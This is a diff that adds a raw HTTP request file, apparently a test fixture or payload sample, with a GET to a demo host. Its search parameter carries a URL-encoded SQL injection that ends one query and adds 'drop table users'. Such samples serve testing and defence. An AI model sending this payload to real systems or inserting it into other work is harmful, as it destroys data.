@@ -1,0 +1,4 @@
+GET /a?search=1;%0adrop%0atable%0ausers-- HTTP/1.1
+Host: demo.example.com
+Connection: close
+
